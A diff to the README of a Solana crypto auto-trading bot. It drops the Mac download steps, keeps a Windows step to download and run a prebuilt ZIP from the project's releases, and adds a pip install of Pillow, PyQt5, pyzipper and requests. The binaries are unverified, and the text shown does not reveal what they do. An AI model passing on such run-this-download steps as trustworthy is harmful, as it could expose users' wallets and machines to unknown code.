@@ -36,14 +36,7 @@ Solana Ultimate Ai Auto Trade Bot is designed for those who truly want to maximi
 
 ## Getting Started 
 
-### Mac Users 
-
-1. Download the packaged version from [here](https://github.com/SolanabuyBot/Solana-Bot/releases/download/V4.1.1/SolAiBot_Mac.zip). 
-2. Unzip the files and Double-click the downloaded DMG file. 
-3. Right-click on `SolAiBot.app` and select `Open` to access the bot. 
-4. Once the bot is running, it may take a few minutes to fetch the list of tokens from the Solana network depending on your internet speed. During this time, you can watch the informational messages on the screen to see what the bot is doing. 
-
-### Windows Users 
+### Windows 
 
 1. Download the packaged version from [here](https://github.com/SolanabuyBot/Solana-Bot/releases/download/V4.1.1/SolAiBot_Win.zip). 
 2. Extract the ZIP file. 
@@ -63,8 +56,12 @@ Download and Install Python here:
 2. **Enter Project Folder**: 
    ```bash 
    cd Solana-Bot
-   ``` 
-3. **Run the Bot**: 
+```
+3. **Install Modules** (Only for Mac users):
+   ```bash 
+   pip install Pillow PyQt5 pyzipper requests
+   ```
+4. **Run the Bot**: 
    ```bash 
    python3 main.py 
    ``` 
